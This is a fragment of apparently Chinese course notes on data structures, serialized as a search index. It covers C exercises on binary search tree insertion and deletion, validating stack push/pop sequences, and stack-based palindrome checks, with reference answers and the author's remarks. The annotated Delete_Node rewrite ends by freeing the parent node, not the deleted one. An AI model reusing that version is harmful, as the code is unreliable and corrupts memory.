&amp;num);\n\n        if (num == -1) {\n                    return;\n        }\n\n        *T = (Bitree)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = num;\n        //(*T)-&gt;lchild = NULL;\n        //(*T)-&gt;rchild = NULL;\n\n        Creat_Bitree(&amp;((*T)-&gt;lchild));\n        Creat_Bitree(&amp;((*T)-&gt;rchild));\n}\n\nvoid Print_Node(Bitree T) {\n    if (T) {\n        Print_Node(T-&gt;lchild);\n        printf(\"%d \", T-&gt;data);\n        Print_Node(T-&gt;rchild);\n    }\n}\n\nvoid Search_Node(Bitree *T, int x) {\n    Bitree p, q, s;\n    p = (Bitree)malloc(sizeof(BiTNode));\n    p-&gt;data = x;\n    p-&gt;lchild = p-&gt;rchild = NULL;\n    if (!(*T)) {\n        *T = p;\n        exit(0);\n    }\n    s = NULL;\n    q = *T;\n    while (q) {\n        s = q;\n        if (q-&gt;data &gt; x)\n            q = q-&gt;lchild;\n        else\n            q = q-&gt;rchild;\n    }\n    if (s-&gt;data &gt; x)\n        s-&gt;lchild = p;\n    else\n        s-&gt;rchild = p;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_25","title":"\u6539\u8fdb\u7b54\u6848","text":"<p>\u8981\u6ce8\u610f<code>exit</code>\u548c<code>return</code>\u7684\u533a\u522b\uff0c\u7136\u540e\u5c31\u662f\u539f\u51fd\u6570\u6ca1\u6709\u9488\u5bf9\u201c\u6811\u4e2d\u6709\u8981\u63d2\u5165\u7684\u8282\u70b9\u201d\u8fdb\u884c\u64cd\u4f5c</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n        int num;\n        //printf(\"\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a\");\n        scanf(\"%d\", &amp;num);\n\n        if (num == -1) {\n                    return;\n        }\n\n        *T = (Bitree)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = num;\n        //(*T)-&gt;lchild = NULL;\n        //(*T)-&gt;rchild = NULL;\n\n        Creat_Bitree(&amp;((*T)-&gt;lchild));\n        Creat_Bitree(&amp;((*T)-&gt;rchild));\n}\n\nvoid Print_Node(Bitree T) {\n    if (T) {\n        Print_Node(T-&gt;lchild);\n        printf(\"%d \", T-&gt;data);\n        Print_Node(T-&gt;rchild);\n    }\n}\n\nvoid Search_Node(Bitree* T, int x) {\n    Bitree p, q, s;\n\n    // \u521b\u5efa\u4e00\u4e2a\u65b0\u8282\u70b9\uff0c\u5e76\u5c06\u503c x \u8d4b\u7ed9\u5b83\n    p = (Bitree)malloc(sizeof(BiTNode));\n    p-&gt;data = x;\n    p-&gt;lchild = p-&gt;rchild = NULL;\n\n    // \u82e5\u6811\u4e3a\u7a7a\uff0c\u5219\u5c06\u65b0\u8282\u70b9\u4f5c\u4e3a\u6811\u7684\u6839\u8282\u70b9\n    if (!(*T)) {\n        *T = p;\n        return;\n    }\n\n    // \u521d\u59cb\u5316 s \u4e3a\u7a7a\uff0cq \u6307\u5411\u6811\u7684\u6839\u8282\u70b9\n    s = NULL;\n    q = *T;\n\n    // \u5728\u6811\u4e2d\u67e5\u627e\u65b0\u8282\u70b9\u5e94\u8be5\u63d2\u5165\u7684\u4f4d\u7f6e\n    while (q) {\n        s = q; // s \u662f\u524d\u9a71\u8282\u70b9\n        if (q-&gt;data &gt; x) {\n            q = q-&gt;lchild;\n        }\n        else if (q-&gt;data &lt; x) {\n            q = q-&gt;rchild;\n        }\n        else {\n            free(p);\n            return; // \u672c\u8eab\u5c31\u6709\u8fd9\u4e2a\u503c\n        }\n    } // \u6ce8\u610f while \u6761\u4ef6\n\n    // \u6839\u636e\u65b0\u8282\u70b9\u7684\u503c\u4e0e\u6700\u540e\u8bbf\u95ee\u5230\u7684\u8282\u70b9\u7684\u503c\u7684\u5927\u5c0f\u5173\u7cfb\uff0c\u786e\u5b9a\u5c06\u65b0\u8282\u70b9\u63d2\u5165\u4e3a\u5de6\u5b50\u8282\u70b9\u8fd8\u662f\u53f3\u5b50\u8282\u70b9\n    if (s-&gt;data &gt; x) {\n        s-&gt;lchild = p;\n    }\n    else {\n        s-&gt;rchild = p;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_26","title":"\u7f16\u5199\u4ece\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u5220\u9664\u4e00\u4e2a\u5173\u952e\u5b57\u7684\u7b97\u6cd5","text":"<p>\u7528\u6237\u901a\u8fc7\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u9010\u4e2a\u8f93\u5165\u4e00\u68f5\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u503c\uff0c\u5176\u4e2d\u4f7f\u7528\u7279\u6b8a\u503c<code>-1</code>\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\u3002\u7f16\u5199\u7a0b\u5e8f\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li>1\u3001\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5148\u5e8f\u904d\u5386\u7ed3\u679c\u521b\u5efa\u4e00\u68f5\u4e8c\u53c9\u6811\u3002</li> <li>2\u3001\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u7279\u5b9a\u7684\u7ed3\u70b9\u503c\uff0c\u7a0b\u5e8f\u5220\u9664\u8be5\u503c\u5bf9\u5e94\u7684\u7ed3\u70b9\uff0c\u5e76\u4fdd\u6301\u4e8c\u53c9\u6811\u7684\u7ed3\u6784\u3002</li> <li>3\u3001\u4ee5\u4e2d\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u51fa\u5220\u9664\u6307\u5b9a\u7ed3\u70b9\u540e\u7684\u4e8c\u53c9\u6811\u3002</li> </ul>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_27","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08-2 \u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a5\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a3\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a6\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u8981\u5220\u9664\u7684\u7ed3\u70b9\u503c\uff1a3\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5220\u9664\u6307\u5b9a\u7ed3\u70b9\u4e4b\u540e\u7684\u4e8c\u53c9\u6811\u4ee5\u4e2d\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u51fa\uff0c\u7ed3\u679c\u662f\uff1a5 6\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_28","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    int data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    // \u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Delete_Node(Bitree *T, int x) {\n     // \u5220\u9664\u6307\u5b9a\u7ed3\u70b9\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Print_Bitree(Bitree T) {\n    // \u4ee5\u4e2d\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u51fa\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    int x;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08-1 \u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\\n\");\n    Creat_Bitree(&amp;T);\n    printf(\"\u8bf7\u8f93\u5165\u8981\u5220\u9664\u7684\u7ed3\u70b9\u503c\uff1a\");\n    scanf(\"%d\", &amp;x);\n    printf(\"\u5220\u9664\u6307\u5b9a\u7ed3\u70b9\u4e4b\u540e\u7684\u4e8c\u53c9\u6811\u4ee5\u4e2d\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u51fa\uff0c\u7ed3\u679c\u662f\uff1a\");\n    Delete_Node(&amp;T, x);\n    Print_Bitree(T);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_29","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u770b\u770b<code>PPT</code>\u5c31\u90fd\u61c2\u4e86\u3002\u591a\u601d\u8003\u7406\u89e3\u3002</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n    int num;\n    printf(\"\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a\");\n    scanf(\"%d\", &amp;num);\n\n    if (num == -1) {\n        return;\n    }\n\n    *T = (Bitree)malloc(sizeof(BiTNode));\n    (*T)-&gt;data = num;\n    //(*T)-&gt;lchild = NULL;\n    //(*T)-&gt;rchild = NULL;\n\n    Creat_Bitree(&amp;((*T)-&gt;lchild));\n    Creat_Bitree(&amp;((*T)-&gt;rchild));\n}\n\nvoid Delete_Node(Bitree *T, int x) {\n    Bitree p, del, q, s;\n    p = *T;\n    del = NULL;\n    while (p) {\n        if (p-&gt;data == x)\n            break;\n        del = p;\n        if (p-&gt;data &gt; x)\n            p = p-&gt;lchild;\n        else\n            p = p-&gt;rchild;\n    }\n    if (!p)\n        return;\n    q = p;\n    if (p-&gt;lchild &amp;&amp; p-&gt;rchild) {\n        s = p-&gt;lchild;\n        while (s-&gt;rchild) {\n            q = s;\n            s = s-&gt;rchild;\n        }\n        p-&gt;data = s-&gt;data;\n        if (q != p)\n            q-&gt;rchild = s-&gt;lchild;\n        else\n            q-&gt;lchild = s-&gt;lchild;\n        free(s);\n        return;\n    } else if (!p-&gt;rchild) {\n        p = p-&gt;lchild;\n    } else if (!p-&gt;lchild) {\n        p = p-&gt;rchild;\n    }\n    if (!del)\n        *T = p;\n    else if (q == del-&gt;lchild)\n        del-&gt;lchild = p;\n    else\n        del-&gt;rchild = p;\n    free(q);\n}\n\nvoid Print_Bitree(Bitree T) {\n    if (T) {\n        Print_Bitree(T-&gt;lchild);\n        printf(\"%d \", T-&gt;data);\n        Print_Bitree(T-&gt;rchild);\n    }\n}\n</code></pre> <p>\u6ce8\u91ca</p> C<pre><code>void Delete_Node(Bitree* T, int x) {\n    // \u5b9a\u4e49\u53d8\u91cf\n    Bitree p, temp, delprev, dell;\n    // \u5982\u679c\u5f85\u5220\u9664\u8282\u70b9\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u5219\u6709\u4fe9\u8282\u70b9\u53ef\u4ee5\u7406\u89e3\u4e3a del\n    // \u4e00\u4e2a\u7528\u6765\u66ff\u6362\u7684\uff0c\u4e00\u4e2a\u88ab\u66ff\u6362\u7684\n    // \u6b64\u51fd\u6570\u4e2d  delprev\u3001del\u662f\u6307\u7528\u6765\u66ff\u6362\u7684\n    // temp \u662f\u88ab\u66ff\u6362\u7684\u8282\u70b9\u7684\u524d\u9a71\uff0cp \u662f\u88ab\u66ff\u6362\u7684\u8282\u70b9\n\n    // \u4ece\u6839\u8282\u70b9\u5f00\u59cb\u904d\u5386\u4e8c\u53c9\u6811\n    p = *T;\n    temp = NULL;\n\n    while (p) {\n        // \u5982\u679c\u627e\u5230\u5f85\u5220\u9664\u8282\u70b9\uff0c\u5219\u8df3\u51fa\u5faa\u73af\n        if (p-&gt;data == x) {\n            break;\n        }\n\n        // \u4fdd\u5b58\u5f53\u524d\u8282\u70b9\uff0c\u5e76\u66f4\u65b0\u6307\u9488\u4ee5\u4fbf\u7ee7\u7eed\u5411\u4e0b\u641c\u7d22\n        temp = p; // \u88ab\u5220\u9664\u8282\u70b9\u7684\u524d\u9a71\u8282\u70b9\n        if (p-&gt;data &gt; x) {\n            p = p-&gt;lchild;\n        }\n        else {\n            p = p-&gt;rchild;\n        }\n    }\n\n    // \u5982\u679c\u672a\u627e\u5230\u5f85\u5220\u9664\u8282\u70b9\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\n    if (!p) {\n        return;\n    }\n\n    // \u6267\u884c\u5230\u8fd9\u513f\u7684\u65f6\u5019\uff0cp\u662f\u88ab\u5220\u9664\u7684\n    delprev = p;\n\n\n    // \u5982\u679c\u5f85\u5220\u9664\u8282\u70b9\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\n    if (p-&gt;lchild &amp;&amp; p-&gt;rchild) {\n        dell = p-&gt;lchild;\n\n        // \u627e\u5230\u5f85\u5220\u9664\u8282\u70b9\u5de6\u5b50\u6811\u4e2d\u6700\u5927\u7684\u8282\u70b9\n        while (dell-&gt;rchild) {\n            delprev = dell; // delprev \u662f del \u7684\u524d\u9a71\n            dell = dell-&gt;rchild; // del: \u4e2d\u5e8f\u904d\u5386\u4e0b\uff0c\u88ab\u5220\u9664\u8282\u70b9\u7684\u524d\u9a71\u8282\u70b9\u505a\u6839\n            // \u4e5f\u5c31\u662f\u5de6\u5b50\u6811\u6700\u53f3\u4e0b\u7684\u8282\u70b9\n        }\n\n        // \u7528\u5de6\u5b50\u6811\u6700\u5927\u8282\u70b9\u7684\u503c\u66ff\u6362\u5f85\u5220\u9664\u8282\u70b9\u7684\u503c\n        p-&gt;data = dell-&gt;data;\n\n        // \u91cd\u65b0\u8fde\u63a5\u7236\u8282\u70b9\u548c\u5de6\u5b50\u6811\n        // \u8fde\u63a5 del \u7684\u5de6\u5b69\u5b50\u5c31\u884c\uff0c\u56e0\u4e3a del \u662f\u6700\u53f3\u4e0b\u7684\uff0c\u80af\u5b9a\u6ca1\u6709\u53f3\u5b69\u5b50\n        if (delprev != p) { // del \u7684\u5de6\u5b69\u5b50\uff0c\u6709\u53f3\u5b69\u5b50\n            delprev-&gt;rchild = dell-&gt;lchild;\n        }\n        else { // del \u7684\u5de6\u5b69\u5b50\uff0c\u6ca1\u6709\u53f3\u5b69\u5b50\n            delprev-&gt;lchild = dell-&gt;lchild;\n        }\n\n        free(dell);\n        return;\n    }\n    // \u5982\u679c\u5f85\u5220\u9664\u8282\u70b9\u53ea\u6709\u4e00\u4e2a\u5de6\u5b50\u8282\u70b9\n    else if (!p-&gt;rchild) { // \u53ea\u6709\u5de6\n        p = p-&gt;lchild;\n    }\n    // \u5982\u679c\u5f85\u5220\u9664\u8282\u70b9\u53ea\u6709\u4e00\u4e2a\u53f3\u5b50\u8282\u70b9\n    else if (!p-&gt;lchild) { // \u53ea\u6709\u53f3\n        p = p-&gt;rchild;\n    }\n\n\n    // \u66f4\u65b0\u7236\u8282\u70b9\u6307\u5411\u5f85\u5220\u9664\u8282\u70b9\u7684\u5b50\u8282\u70b9\n    if (!temp) { // \u6811\u7684\u6839\u88ab\u5220\u9664\n        *T = p;\n    }\n    else if (delprev == temp-&gt;lchild) {\n        temp-&gt;lchild = p;\n    }\n    else {\n        temp-&gt;rchild = p;\n    }\n\n    free(temp);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_30","title":"\u5f85\u5b8c\u6210","text":"<p>\u6700\u540e\u8fd9\u4e2a\u9898\u7684<code>Delete_Node()</code>\u51fd\u6570\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u64cd\u4f5c\u201c\u66f4\u65b0\u7236\u8282\u70b9\u6307\u5411\u5f85\u5220\u9664\u8282\u70b9\u7684\u5b50\u8282\u70b9\u201d\uff0c\u6211\u5e76\u6ca1\u6709\u770b\u61c2\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/","title":"Alpha \u6808\u548c\u961f\u5217","text":""},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_1","title":"\u5165\u6808\u51fa\u6808\u64cd\u4f5c\u5408\u6cd5\u6027\u5224\u65ad","text":"<p>\u5047\u8bbe\u4ee5 0 \u548c 1 \u5206\u522b\u8868\u793a\u51fa\u6808\u548c\u5165\u6808\u64cd\u4f5c\u3002\u6808\u7684\u521d\u59cb\u4e3a\u7a7a\uff0c\u7f16\u5199\u51fd\u6570\uff0c\u5224\u65ad\u5165\u6808\u548c\u51fa\u6808\u64cd\u4f5c\u7684\u5408\u6cd5\u6027\uff0c\u5f53\u64cd\u4f5c\u5e8f\u5217\u5408\u6cd5\u65f6\uff0c\u4e3b\u51fd\u6570\u8f93\u51fa True\uff0c\u5426\u5219\uff0c\u8f93\u51fa False\u3002</p> <p>\u793a\u4f8b\u4e00\uff1a</p> <p>\u64cd\u4f5c\u5e8f\u5217</p> Text Only<pre><code>01001010\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>False\n</code></pre> <p>\u793a\u4f8b\u4e8c\uff1a</p> <p>\u64cd\u4f5c\u5e8f\u5217</p> Text Only<pre><code>11001010\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>True\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_2","title":"\u9898\u76ee","text":"C<pre><code>//\u5224\u65ad\u6808\u64cd\u4f5c\u5408\u6cd5\u6027\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//\u5224\u65ad\u5165\u6808\u51fa\u6808\u64cd\u4f5c\u5e8f\u5217\u662f\u5426\u662f\u5408\u6cd5\u5e8f\u5217\u3002\u5982\u662f\uff0c\u8fd4\u56de1\uff0c\u5426\u5219\u8fd4\u56de0\n//\u8f93\u5165\u53c2\u6570\uff1a\u64cd\u4f5c\u5e8f\u5217\nint Judge(char ch[])\n{\n\n}\n\nint main()\n{\n    char ch[] = \"11001010\";\n    int i = 0;\n\n    if(Judge(ch))\n        printf(\"True\");\n    else\n        printf(\"False\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_3","title":"\u7b54\u6848","text":"<p>\u4e24\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u5427\uff0c\u7b2c\u4e00\u662f<code>ch[i] != '\\0'</code>\uff0c\u522b\u5199\u6210<code>'\\n'</code>\u3002\u7b2c\u4e8c\u662f<code>if (ch[i] == '1')</code>\uff0c\u6ce8\u610f\u662f\u5b57\u7b26\uff0c\u4e0d\u662f\u6570\u5b57\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n// \u5224\u65ad\u5165\u6808\u51fa\u6808\u64cd\u4f5c\u5e8f\u5217\u662f\u5426\u662f\u5408\u6cd5\u5e8f\u5217\u3002\u5982\u662f\uff0c\u8fd4\u56de1\uff0c\u5426\u5219\u8fd4\u56de0\n// \u8f93\u5165\u53c2\u6570\uff1a\u64cd\u4f5c\u5e8f\u5217\nint Judge(char ch[])\n{\n    int stack[100] = { 0 };  // \u6808\n    int top = -1;         // \u6808\u9876\u6307\u9488\n\n    for (int i = 0; ch[i] != '\\0'; i++) {\n        if (ch[i] == '1') {\n            // \u5165\u6808\u64cd\u4f5c\n            stack[++top] = 1;\n        }\n        else if (ch[i] == '0') {\n            // \u51fa\u6808\u64cd\u4f5c\n            if (top == -1) {\n                // \u6808\u4e3a\u7a7a\n                return 0;\n            }\n            else {\n                // \u5339\u914d\u6210\u529f\uff0c\u51fa\u6808\n                top--;\n            }\n        }\n        else {\n            // \u975e\u6cd5\u5b57\u7b26\n            return 0;\n        }\n    }\n\n    // \u64cd\u4f5c\u5e8f\u5217\u904d\u5386\u5b8c\u6bd5\uff0c\u5982\u679c\u6808\u4e3a\u7a7a\u5219\u5e8f\u5217\u5408\u6cd5\uff0c\u5426\u5219\u4e0d\u5408\u6cd5\n    // \u9519\u8bef\u7684\uff0c\u7406\u89e3\u9519\u4e86\uff0c\u6700\u540e\u4e0d\u4e00\u5b9a\u7684\u5f97\u5168\u62ff\u51fa\u6765\n    //return top == -1;\n    return 1;\n}\n\nint main()\n{\n    char ch[] = \"11011010\";\n\n    if (Judge(ch))\n        printf(\"True\\n\");\n    else\n        printf(\"False\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_4","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code> //\u5224\u65ad\u5165\u6808\u51fa\u6808\u64cd\u4f5c\u5e8f\u5217\u662f\u5426\u662f\u5408\u6cd5\u5e8f\u5217\u3002\u5982\u662f\uff0c\u8fd4\u56de1\uff0c\u5426\u5219\u8fd4\u56de0\n//\u8f93\u5165\u53c2\u6570\uff1a\u64cd\u4f5c\u5e8f\u5217\nint Judge(char ch[])\n{\n    int i, top;\n    i = 0;\n    top = 0;\n\n    while (ch[i] != '\\0')\n    {\n        switch (ch[i])\n        {\n        case '1':\n            top++;\n            break;\n        case '0':\n            top--;\n            if (top &lt; 0) {\n                return 0;\n            }\n            break;\n        }\n        i++;\n    }\n    return 1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_5","title":"\u5224\u65ad\u56de\u6587\u5b57\u7b26\u4e32","text":"<p>1\u3001\u8bd5\u5199\u4e00\u4e2a\u7b97\u6cd5\uff0c\u5b9e\u73b0\u5224\u65ad\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u56de\u6587\u5b57\u7b26\u4e32\u7684\u529f\u80fd\u3002\u5982\u679c\u662f\u56de\u6587\u5b57\u7b26\u4e32\u5219\u8f93\u51fa<code>\u8be5\u5b57\u7b26\u4e32\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01</code>\uff0c\u5982\u679c\u4e0d\u662f\u5219\u8f93\u51fa<code>\u8be5\u5b57\u7b26\u4e32\u4e0d\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01</code>\u3002 2\u3001\u4f7f\u7528\u6808\u7684\u6570\u636e\u7ed3\u6784\u6765\u5b9e\u73b0\u5224\u65ad\u3002 3\u3001\u56de\u6587\u5b57\u7b26\u4e32\u662f\u6307\u6b63\u5411\u548c\u53cd\u5411\u8bfb\u90fd\u4e00\u6837\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982\uff0c\u201cradar\u201d\u3001\"level\"\u90fd\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff0c\u800c\"hello\"\u4e0d\u662f\u3002 4\u3001\u7a0b\u5e8f\u5e94\u8be5\u80fd\u591f\u5904\u7406\u4efb\u610f\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002</p> <p>\u793a\u4f8b 1\uff1a</p> <p>\u8f93\u5165\uff1a</p> Text Only<pre><code>abba\n</code></pre> <p>\u8f93\u51fa\uff1a</p> Text Only<pre><code>\u8be5\u5b57\u7b26\u4e32\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01\n</code></pre> <p>\u793a\u4f8b 2\uff1a</p> <p>\u8f93\u5165\uff1a</p> Text Only<pre><code>good\n</code></pre> <p>\u8f93\u51fa\uff1a</p> Text Only<pre><code>\u8be5\u5b57\u7b26\u4e32\u4e0d\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_6","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>1\u3001\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u8d85\u8fc7\u6808\u7684\u6700\u5927\u5bb9\u91cf\u3002 2\u3001\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u4e86\u52a8\u6001\u5185\u5b58\u5206\u914d\u6765\u521b\u5efa\u6808\uff0c\u786e\u4fdd\u91ca\u653e\u5185\u5b58\u4ee5\u9632\u6b62\u5185\u5b58\u6cc4\u6f0f\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_7","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;   //\u5206\u914d\u5185\u5b58\u65f6\u5e94\u7528\n#define StackSize 100 //\u8bbe\u7f6e\u6808\u7684\u6700\u5927\u5185\u5b58\u7a7a\u95f4\n\ntypedef struct {\n    //\u5b9a\u4e49\u6808\u7ed3\u6784\u4f53\n    char data[StackSize];\n    int top;\n} SeqStack;\n\nint Push_Stack (SeqStack *s, char x);\nint Pop_Stack (SeqStack *s, char *x);\n\nint IsEmpty (SeqStack *s) {\n    //\u5224\u65ad\u6808\u662f\u5426\u4e3a\u7a7a\n\n}\n\nint IsHuiwen () {\n    //\u5224\u65ad\u56de\u6587\u6570\n\n}\n\nint Push_Stack (SeqStack *s, char chr) {\n    //\u8fdb\u884c\u5165\u6808\u64cd\u4f5c\n\n}\n\nint Pop_Stack (SeqStack *s, char *chr) {\n    //\u53d6\u51fa\u6808\u9876\u5143\u7d20\n\n}\n\nint main () {\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32\u5e8f\u5217\uff1a\");\n    if (IsHuiwen())\n        printf(\"\\n\u8be5\u5b57\u7b26\u4e32\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01\\n\");\n    else\n        printf(\"\\n\u8be5\u5b57\u7b26\u4e32\u4e0d\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01\\n\");\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_8","title":"\u7b54\u6848","text":"<p>\u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528\u4e86\u6808\u7684\u6570\u636e\u7ed3\u6784\u6765\u5224\u65ad\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u56de\u6587\u5b57\u7b26\u4e32\u3002\u9996\u5148\uff0c\u5c06\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u9010\u4e2a\u5b57\u7b26\u5165\u6808\uff0c\u7136\u540e\u518d\u9010\u4e2a\u5b57\u7b26\u51fa\u6808\u5e76\u4e0e\u539f\u5b57\u7b26\u4e32\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u6bcf\u6b21\u51fa\u6808\u7684\u5b57\u7b26\u4e0e\u539f\u5b57\u7b26\u4e32\u5bf9\u5e94\u4f4d\u7f6e\u7684\u5b57\u7b26\u76f8\u7b49\uff0c\u5219\u7ee7\u7eed\u6bd4\u8f83\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff0c\u5426\u5219\u8fd4\u56de\u4e0d\u662f\u56de\u6587\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6bd4\u8f83\u5b8c\u6210\u540e\u6ca1\u6709\u8fd4\u56de\uff0c\u5219\u8bf4\u660e\u662f\u56de\u6587\u5b57\u7b26\u4e32\u3002</p> <p>\u6ce8\u610f\uff0c\u5728\u672c\u4ee3\u7801\u4e2d\uff0c\u6211\u6dfb\u52a0\u4e86\u5bf9\u6808\u6ee1\u548c\u6808\u7a7a\u7684\u68c0\u67e5\uff0c\u4ee5\u53ca\u5bf9\u8f93\u5165\u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u9650\u5236\u3002</p> <p>\u8fd8\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4f7f\u7528\u52a8\u6001\u5185\u5b58\u5206\u914d\u51fd\u6570<code>malloc</code>\u548c\u91ca\u653e\u5185\u5b58\u51fd\u6570<code>free</code>\u65f6\uff0c\u9700\u8981\u5305\u542b\u5934\u6587\u4ef6<code>stdlib.h</code>\u3002</p> <p>\u8fd8\u6709\u5c31\u662f\u9898\u76ee\u4e2d\u7684<code>main()</code>\u4e0d\u662f\u5f88\u5b8c\u5584\uff0c\u6211\u7a0d\u7a0d\u6539\u4e86\u6539\u3002\u5728\u8f93\u5165\u5b57\u7b26\u4e32\u65f6\u4f7f\u7528\u4e86<code>fgets</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u5904\u7406\u4efb\u610f\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u53bb\u9664\u4e86\u672b\u5c3e\u7684\u6362\u884c\u7b26\u3002\uff08<code>string.h</code>\uff09</p> <p>\u4e00\u5b9a\u8981\u81ea\u5df1\u5b8c\u5584\u4e00\u4e0b<code>main()</code>\uff0c\u5426\u5219\u8fc7\u4e0d\u4e86\u68c0\u67e5\u3002</p> 